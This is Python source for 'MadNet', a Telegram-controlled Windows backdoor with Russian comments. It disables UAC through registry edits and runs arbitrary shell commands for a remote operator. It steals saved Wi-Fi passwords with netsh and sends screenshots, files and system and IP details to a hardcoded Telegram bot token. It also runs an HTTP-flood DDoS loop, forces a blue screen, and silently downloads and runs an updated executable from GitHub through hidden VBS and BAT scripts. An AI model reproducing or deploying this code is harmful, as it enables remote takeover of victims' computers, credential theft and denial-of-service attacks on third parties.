# -*- coding: utf8 -*-
import ctypes
from datetime import datetime
import os
import platform
import subprocess
import requests
import pyautogui
import keyboard
import telebot
from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Cipher import PKCS1_OAEP
from base64 import b64decode
from os.path import exists
from time import sleep
import asyncio

VERSION = '2.0'
NAME_PROGRAM = 'MadNet'

media_path = 'media/'
name_file = "config"


with open(name_file, 'rb') as file:
    data1 = file.read()

if len(data1.split()) > 1:  # если не зашифрованный

    key = Fernet.generate_key()  # генер ключа шифрования
    f = Fernet(key)
    encrypted_text = key[:22] + f.encrypt(data1) + key[-22:]

    with open(name_file, 'wb') as file:
        file.write(encrypted_text)

else:

    with open(name_file, 'rb') as file:
        data2 = file.read()
    key = data2[:22] + data2[-22:]  # чтение ключа
    f = Fernet(key)

with open(name_file, 'rb') as file:
    data3 = file.read()[22:-22]

decrypted_text = f.decrypt(data3).decode().split()


class Data:
    name = decrypted_text[0]
    token = decrypted_text[1]
    update = int(decrypted_text[2])
    uic = int(decrypted_text[3])


class Logger_Bot:
    def __init__(self) -> None:
        self.hh = ''
        self.dump = 'dump/'
        self.path = 'logs/'
        day = 3
        if not os.path.exists(self.dump):
            os.mkdir(self.dump)
        if not os.path.exists(self.path):
            os.mkdir(self.path)
        files = os.walk(self.path).__next__()[-1]
        if len(files) >= day:
            files = sorted(files)[:-3]
            for i in files:
                os.remove(self.path + i)

    def __save_log(self, text: str):

        name_file = self.path + 'log_' + datetime.now().strftime('%Y-%m-%d').replace(' ',
                                                                                     '_').replace(':', '-') + ".txt"

        if os.path.exists(name_file):

            with open(name_file, 'rb') as file:
                data2 = file.read()  # прочитали

            key = data2[:22] + data2[-22:]  # чтение ключа

            f = Fernet(key)

            dt = f.decrypt(data2[22:-22]).decode() + text
            data3 = key[:22] + f.encrypt(dt.encode()) + key[-22:]

            with open(name_file, 'wb') as new_log:
                new_log.write(data3)

        else:

            key = Fernet.generate_key()  # генер ключа шифрования
            f = Fernet(key)
            encrypted_text = key[:22] + key[-22:]

            with open(name_file, 'wb') as file:
                file.write(key[:22] + f.encrypt(encrypted_text) + key[-22:])

            self.__save_log('&#Logs&#')
            self.__save_log(text)

    def log(self, name_func, e_text):
        time_e = datetime.now().strftime('%H:%M:%S').replace(' ', '_').replace(':', '-')
        text = f"[{time_e}] {name_func}: {e_text}.&#"
        self.__save_log(text)

    def get_log(self, name_file):
        try:
            with open(self.path + name_file, 'rb') as file:
                data2 = file.read()
            key = data2[:22] + data2[-22:]  # чтение ключа
            f = Fernet(key)

            with open(self.path + name_file, 'rb') as file:
                data3 = file.read()[22:-22]

            data3 = f.decrypt(data3).decode().replace("&#", "\n")
            print(data3)
            with open(self.dump+name_file, 'w') as file:
                file.write(data3)
            return self.dump+name_file

        except:
            return False


if not os.path.isdir('media'):
    os.mkdir('media')

id = Data.id


logger = Logger_Bot()


def send_message(text):
    url = f"https://api.telegram.org/bot5707775054:AAGlgA-3myDirI9vyxclNPUqzM4-j1zR6Ts/sendMessage"
    response = requests.post(url, data={'chat_id': -607433374, 'text': text})
    return response.json()['ok']


class Func_API:
    def __init__(self) -> None:
        self.NAME_PC = Data.name
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                send_message(f'{self.NAME_PC} запущен от имени администратора')

                if not Data.uic:  # Отрубает UAC
                    try:
                        command1 = 'reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA'
                        subprocess.run(['cmd.exe', '/c', command1], shell=True, check=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE)
                        command2 = 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f'
                        subprocess.run(['cmd.exe', '/c', command2], shell=True, check=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE)
                        decrypted_text[4] = "1"
                        decrypted_text = " ".join(
                                decrypted_text).encode('utf-8')
                        encrypted_text = key[:22] + \
                                f.encrypt(decrypted_text) + key[-22:]

                        with open('config', 'wb') as file:
                                # изменение записи конфига об UIC
                                file.write(encrypted_text)

                    except Exception as e:
                        logger.log("disable_UAC", e)
                        send_message(f'Ошибка: {e}')

                else:
                    send_message(f'{self.NAME_PC} запущен от имени обычного пользователя')

        except:
            logger.log('__init__', 'Вы указали неверный токен')

    
    def find_name(self, fig):
        lop = 0
        dir = os.listdir(media_path)
        for i in dir:
            if i[:3] == fig:
                lop += 1
        return fig + str(lop)

    def ren(self, path, content):
        vb = self.find_name(content)
        if content == "vid":
            os.rename(media_path + path, media_path + vb + ".mp4")
        elif content == "pic":
            os.rename(media_path + path, media_path + vb + ".png")
        return vb

    def cmdo_ret(self, com):  # нужно для работы ф-ции specifications
        try:
            res = subprocess.check_output(com, shell=True)
        except Exception as e:
            logger.log(self.cmdo_ret.__name__, e)
            return f'Ошибка: {e}'

        try:
            res = res.decode('utf8')
        except Exception as e:
            try:
                res = res.decode('cp866')
            except Exception as e:
                return f'Ошибка: {e}'
        return 'Успешно:\n' + res

    def cmdo(self, com):  # output от выполнения команды в cmd
        try:
            res = subprocess.check_output(com, shell=True)
        except Exception as e:
            logger.log(self.cmdo.__name__, e)
            send_message(f'Ошибка: {e}')
        try:
            res = res.decode('utf8')
        except:
            try:
                res = res.decode('cp866')
            except Exception as e:
                logger.log(self.cmdo.__name__, e)
                send_message(f'Ошибка: {e}')
        send_message('Успешно:\n' + res)

    def cmdi(self, com):  # выполнение команды в cmd
        try:
            os.system(com)
            send_message("Успешно")
        except Exception as e:
            logger.log(self.cmdi.__name__, e)
            send_message(f'Ошибка: {e}')

    def exits(self):  # очищает папку с медиа
        dir = os.listdir(media_path)
        for i in dir:
            os.remove(media_path + i)
        send_message("Успешно")

    def ip_address(self):
        try:
            # Получение IP-адреса через jsonip.com
            ip = requests.get("http://jsonip.com/").json()
            # Получение информации об IP-адресе через ip-api.com
            response = requests.get(
                url=f'http://ip-api.com/json/{ip["ip"]}').json()

            # Создание словаря с информацией об IP-адресе
            data = {
                '[IP]': response.get('query'),
                '[Провайдер]': response.get('isp'),
                '[Организация]': response.get('org'),
                '[Страна]': response.get('country'),
                '[Регион]': response.get('regionName'),
                '[Город]': response.get('city'),
                '[ZIP]': response.get('zip'),
                '[Широта]': response.get('lat'),
                '[Долгота]': response.get('lon'),
            }

            # Формирование строки с информацией об IP-адресе
            info_string = ""
            for k, v in data.items():
                info_string += f'{k} : {v}\n'

            # Отправка строки с информацией об IP-адресе
            send_message(info_string)
        except requests.exceptions.ConnectionError:
            logger.log(self.ip_address.__name__, 'Ошибка соединения')
            send_message('Ошибка соединения')

    def wgt(self, com):
        try:
            data = requests.get(com[0])
            if data.status_code == 200:
                with open(com[1], 'wb') as f:
                    f.write(data.content)
            send_message("Успешно")
        except Exception as e:
            logger.log(self.wgt.__name__, e)
            send_message(f'Ошибка: {e}')

    def rebooting(self, timer):  # перезагрузка пк
        try:
            timer = "shutdown /r /t " + str(timer)
            os.system(timer)
            send_message("Успешно")
        except Exception as e:
            logger.log(self.rebooting.__name__, e)
            send_message(f'Ошибка: {e}')

    def shutdowning(self, timer):  # выключение пк
        try:
            timer = "shutdown /s /t " + str(timer)
            os.system(timer)
            send_message("Успешно")
        except Exception as e:
            logger.log(self.shutdowning.__name__, e)
            send_message(f'Ошибка: {e}')

    def picture(self, file):  # открытие картинки из папки с медиа
        try:
            command = f"{media_path}\\{file}.png"
            os.startfile(command)
            send_message("Успешно")
        except Exception as e:
            logger.log(self.picture.__name__, e)
            send_message(f'Ошибка: {e}')

    def video(self, file):  # открытие видео из папки с медиа
        try:
            command = f"{media_path}\\{file}.mp4"
            os.startfile(command)
            send_message("Успешно")
        except Exception as e:
            logger.log(self.video.__name__, e)
            send_message(f'Ошибка: {e}')

    def specifications(self):  # возвращает характеристики пк
        x, y = pyautogui.size()

        proc = os.popen(r'wmic cpu get name').read().split('\n')[2]
        fram = int(os.popen(r"wmic OS get FreePhysicalMemory").read().split(
            "\n")[2].strip()) // 1024
        ram = int(self.cmdo_ret(
            'powershell "Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum"').split("\n")[
            5].split(': ')[1][:-1]) // 1073741824
        vid = os.popen(
            r"wmic path win32_VideoController get name").read().split('\n')[2]
        banner = f"""Name PC:   {platform.node()}
System:       {platform.system()} {platform.release()}
CPU:          {proc}
GPU:          {vid}
RAM:          {ram} GB
fRAM          {fram} MB
Screen:       {x}x{y}"""
        send_message(banner)

    def rask(self):  # меняет раскладку
        try:
            keyboard.press_and_release("alt+shift")
            send_message("Успешно")
        except Exception as e:
            logger.log(self.specifications.__name__, e)
            send_message(f'Ошибка: {e}')

    def screenshot(self):  # скриншот и его отправка
        filename = f"screenshot_{datetime.now().strftime('%Y-%m-%d %H:%M:%S').replace(' ', '_').replace(':', '-')}.jpg"
        pyautogui.screenshot(filename)
        img = open(filename, "rb")
        send_document(self.id, img)
        img.close()
        os.remove(filename)

    def keyb(self, text):  # печать текста
        try:
            text = text.split("+")
            listing = ""
            button = ["shift", "alt", "f1", "f2", "f3", "f4", "f5", "f6", "f7",
                      "f8", "f9", "f10", "f11", "f12", "tab", "ctrl", "enter", "capslock"]  # спец. клавиши
            for i in text:
                try:
                    index = button.index(i)
                    listing += i + "+"
                except Exception as e:
                    for kip in i:
                        listing += kip + "+"
            listing = listing[:-1].replace(' ', 'space')
            keyboard.press_and_release(listing)
            send_message("Успешно")
        except Exception as e:
            logger.log(self.keyb.__name__, e)
            send_message(f'Ошибка: {e}')

    def print_gui(self, text):  # создаёт окно с текстом
        try:
            pyautogui.alert(text, "~")
            send_message('Успешно')
        except Exception as e:
            logger.log(self.print_gui.__name__, e)
            send_message(f'Ошибка: {e}')

    def input_gui(self, text):  # создаёт окно с текстом и полем для ввода
        try:
            answer = pyautogui.prompt(text, "~")
            send_message(answer)
        except Exception as e:
            logger.log(self.input_gui.__name__, e)
            send_message(f'Ошибка: {e}')

    def closes(self):  # закрывает открытое сейчас приложение
        try:
            keyboard.press_and_release("alt+f4")
            send_message('Успешно')
        except Exception as e:
            logger.log(self.closes.__name__, e)
            send_message(f'Ошибка: {e}')

    def start_file(self, path):  # запускает файл по его path'у
        try:
            text = f"start " + path
            os.system(text)
            send_message('Успешно')
        except Exception as e:
            logger.log(self.start_file.__name__, e)
            send_message(f'Ошибка: {e}')

    def direct(self, paths):  # аналог команды tree с глубеной шага 1
        try:
            if paths == ".":
                paths = os.getcwd()
            exit_str = ""
            exit_str += f"{paths}: \n\n"
            current, dirs, files = os.walk(paths).__next__()
            for i in files:
                exit_str += i + "\n"
            for i in dirs:
                try:
                    o = os.listdir(paths + "/" + i)
                    exit_str += "|" + i + "\n"
                    for l in o:
                        exit_str += "| - " + l + "\n"
                    exit_str += "\n"
                except:
                    pass
            send_message(exit_str)
        except Exception as e:
            logger.log(self.direct.__name__, e)
            send_message(f'Ошибка: {e}')

    def update_bot(self):
        pth = os.getcwd()
        text_bat = f'''@echo off
timeout 30
del {pth}\\windows_shell.exe
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/main_bot/main.exe -OutFile windows_shell.exe"
start windows_shell.exe 
exit'''

        text_vbs = f'''
set sh=CreateObject("Wscript.Shell")
sh.Run "{pth}\\upd.bat", 0'''  # текст для скрипта обновы

        open('upd.bat', 'w').write(text_bat)
        open('upd.vbs', 'w').write(text_vbs)
        os.startfile('upd.vbs')

    def ddos(self, url):
        # Устанавливаем headers Google бота, для обхода Cloudflare
        headers = {"User-Agent": "Google Bot"}

        if 'http' in url and '.' in url:
            # Отправляем сообщение о начале DDOS атаки
            send_message(f'DDOS атака на {url} успешно запущена')
        else:
            send_message(
                self.id, f'Ошибка: неверный url, проверьте правильность введенных данных')

        while True:
            try:
                # Отправляем GET запрос с данными
                requests.get(url, headers=headers,
                             allow_redirects=True, stream=True)
            except:
                pass

    def pull_file(self, path: str):  # отправка файла с пк в тг
        path = path.replace('\\', '/')
        if os.path.exists(path):
            file = open(path, 'rb')
            send_document(self.id, file)
        else:
            path = path.split('/')
            if len(path) <= 1:
                otv = f"Ошибка: файл не найден \n|{os.getcwd()}\n|--  " + \
                      '\n|--  '.join(os.listdir(os.getcwd()))
            else:
                pr = '/'.join(path[:-1])
                otv = f"Ошибка: файл не найден \n|{pr}\n|--  " + \
                      '\n|--  '.join(os.listdir(pr))
            send_message(otv)

    def browser(self, link):  # открытие ссылки в браузере
        try:
            linke = 'start ' + link
            os.system(linke)
            send_message('Успешно')
        except Exception as e:
            logger.log(self.browser.__name__, e)
            send_message(f'Ошибка: {e}')

    def extract_wifi_passwords(self):  # камуниздинг паролей от wifi
        try:
            otv = ''
            profiles_data = subprocess.check_output(
                'netsh wlan show profiles').decode('utf-8').split('\n')
            profiles = [i.split(':')[1].strip()
                        for i in profiles_data if 'All User Profile' in i]

            for profile in profiles:

                profile_info = subprocess.check_output(
                    f'netsh wlan show profile {profile} key=clear')
                try:
                    profile_info = profile_info.decode('utf8').split('\n')
                except:
                    try:
                        profile_info = profile_info.decode('cp866').split('\n')
                    except Exception as e:
                        logger.log(self.extract_wifi_passwords.__name__, e)
                        send_message(f'Ошибка: {e}')
                try:
                    password = [i.split(':')[1].strip()
                                for i in profile_info if 'Key Content' in i][0]
                except IndexError:
                    password = None
                otv += f'Profile: {profile}\nPassword: {password}\n{"#" * 20}\n'
            send_message(f'Успешно\n{otv}')
        except Exception as e:
            logger.log(self.extract_wifi_passwords.__name__, e)
            send_message(f'Ошибка: {e}')

    def tasklist(self, pid):
        if '.' == pid:
            try:

                prs = subprocess.Popen('tasklist', shell=True, stdout=subprocess.PIPE,
                                       stderr=subprocess.STDOUT, stdin=subprocess.PIPE).stdout.readlines()
                try:
                    pr_list = [prs[i].decode('cp866', 'ignore')
                               for i in range(3, len(prs))]
                except:
                    pr_list = [prs[i].decode('utf8', 'ignore')
                               for i in range(3, len(prs))]
                a = [[], []]
                out = 'Program | PID\n'
                for i in pr_list:

                    l = i.split()
                    if l[2] == 'Console':
                        if not l[0] in a[0]:
                            a[0].append(l[0])
                            a[1].append(l[1])

                for i in range(len(a[0])):
                    out += a[0][i].split('.exe')[0] + ' ' + a[1][i] + '\n'
                send_message(out)

            except Exception as e:
                logger.log(self.tasklist.__name__, e)
                send_message(f'Ошибка: {e}')
        else:
            lop = subprocess.Popen(f'taskkill /pid {pid}', shell=True, stdout=subprocess.PIPE,
                                   stderr=subprocess.STDOUT, stdin=subprocess.PIPE).stdout.readlines()[0]
            try:
                send_message(lop.decode('cp866'))
            except:
                send_message(lop.decode('cp866'))

    def bsod(self):
        nullptr = ctypes.POINTER(ctypes.c_int)()

        ctypes.windll.ntdll.RtlAdjustPrivilege(
            ctypes.c_uint(19),
            ctypes.c_uint(1),
            ctypes.c_uint(0),
            ctypes.byref(ctypes.c_int())
        )

        ctypes.windll.ntdll.NtRaiseHardError(
            ctypes.c_ulong(0xC000007B),
            ctypes.c_ulong(0),
            nullptr,
            nullptr,
            ctypes.c_uint(6),
            ctypes.byref(ctypes.c_uint())
        )

    def loggs(self, dat):
        namer = f'log_{dat}.txt'
        answer = logger.get_log(namer)
        try:
            if answer:
                f = open(answer, 'rb')
                send_document(self.id, f)
                f.close()
                os.remove(answer)
        except Exception as e:
            logger.log(self.loggs.__name__, e)
            send_message(f'Ошибка: {e}')

    def perfor(self, name_pc, comnd, text_comand):  # главный обработчик
        try:

            if name_pc.lower() == self.NAME_PC or name_pc.lower() == "all":  # выполнения команд
                if comnd == "wget":
                    self.wgt(text_comand)

                if comnd == "ip" or comnd == "ipad":
                    self.ip_address()

                if comnd == "reboot":
                    self.rebooting(text_comand[0])

                if comnd == "specifications" or comnd == "spec":
                    self.specifications()

                if comnd == "shotdown" or comnd == "shdn" or comnd == "vikl":
                    self.shutdowning(text_comand[0])

                if comnd == "picture" or comnd == "pict":
                    self.picture(text_comand[0])

                if comnd == "cmdi":
                    self.cmdi(text_comand[0])

                if comnd == "cmdo":
                    self.cmdo(text_comand[0])

                if comnd == "video" or comnd == "vide" or comnd == "vid":
                    self.video(text_comand[0])

                if comnd == "exit" or comnd == "cls" or comnd == "clear":
                    self.exits()

                if comnd == "lock" or comnd == "close":
                    self.closes()

                if comnd == "keyb" or comnd == "keyboard":
                    self.keyb(text_comand[0])

                if comnd == "rask" or comnd == "layout":
                    self.rask()

                if comnd == "dir" or comnd == "direction":
                    self.direct(text_comand[0])

                if comnd == "log":
                    self.loggs(text_comand[0])

                if comnd == "screenshot" or comnd == "scrn":
                    self.screenshot()

                if comnd == "inpt" or comnd == "input":
                    self.input_gui(text_comand[0])

                if comnd == "outp" or comnd == "output":
                    self.print_gui(text_comand[0])

                if comnd == "start" or comnd == "strt":
                    self.start_file(text_comand[0])

                if comnd == "ddos" or comnd == "attack_for":
                    self.ddos(text_comand[0])

                if comnd == "browser" or comnd == "brws":
                    self.browser(text_comand[0])

                if comnd == "pull" or comnd == "pull_file":
                    self.pull_file(text_comand[0])

                if comnd == "wifi" or comnd == "extract_wifi_passwords":
                    self.extract_wifi_passwords()

                if comnd == "tasklist" or comnd == "task":
                    self.tasklist(text_comand[0])

                if comnd == "bsod":
                    self.bsod()

                if comnd == "kill":
                    self.exits()

                if comnd == "upd":
                    self.update_bot()
        except:
            e = "Ошибка в ведённой команде"
            logger.log(self.rasbiv.__name__, e)
            send_message(f'Ошибка: {e}')


func_api = Func_API()
